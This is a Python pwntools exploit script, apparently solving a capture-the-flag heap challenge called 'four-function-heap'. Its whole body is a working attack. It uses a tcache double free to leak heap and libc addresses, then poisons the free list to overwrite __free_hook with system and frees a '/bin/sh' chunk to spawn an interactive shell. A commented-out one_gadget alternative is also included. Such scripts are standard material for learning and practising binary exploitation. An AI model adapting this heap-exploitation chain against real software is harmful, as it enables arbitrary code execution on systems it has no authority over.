#!/usr/bin/python3

from pwn import *

p = process("./four-function-heap_patched")
elf = ELF("./four-function-heap_patched", checksec = 0)
libc = elf.libc


c = lambda a : p.sendlineafter(b"{{prompts.menu}}: ", a)
s = lambda a : p.send(a)
sl = lambda a: p.sendline(a)
sla = lambda a, b : p.sendlineafter(a, b)
sf = lambda a, b: p.sendafter(a, b)
ru = lambda a : p.recvuntil(a)
d = lambda : gdb.attach(p)

def alloc(idx, size, data : bytes):
    c(b"1")
    sla(b"{{prompts.index}}: ", str(idx))
    sla(b"{{prompts.size}}: ", str(size))
    sf(b"{{prompts.read}}: ", data)

def free(idx):
    c(b"2")
    sla(b"{{prompts.index}}: ", str(idx))

def show(idx):
    c(b"3")
    sla(b"{{prompts.index}}: ", str(idx))

def exploit():
    alloc(0, 0x70, b"A" * 0x10)
    for i in range(2):
        free(0)
    show(0)
    heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
    heap_base = heap_leak & ~0xfff
    log.info("Heap Base @ " + hex(heap_base))
    alloc(0, 0x900, p64(heap_leak))
    alloc(0, 0x10, b"A" * 8)
    alloc(0, 0x70, p64(heap_base + 0x2e0) * 2)
    alloc(0, 0x70, p64(heap_leak))
    alloc(0, 0x70, b"A" * 8)
    free(0)
    show(0)
    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym.main_arena - 96
    log.info("Libc base @ " + hex(libc.address))
    # 0x4f2c5 | 0x4f322 | 0x10a38c
    """
    alloc(0, 0x70, p64(libc.sym.__free_hook))
    alloc(0, 0x70, p64(libc.sym.__free_hook))
    alloc(0, 0x70, p64(libc.address + 0x4f322))
    free(0)
    """
    alloc(0, 0x70, p64(libc.sym.__free_hook - 0x8))
    alloc(0, 0x70, p64(libc.sym.__free_hook - 0x8))
    alloc(0, 0x70, b"/bin/sh\x00" + p64(libc.sym.system))
    free(0)
    d()
    p.interactive()
exploit()
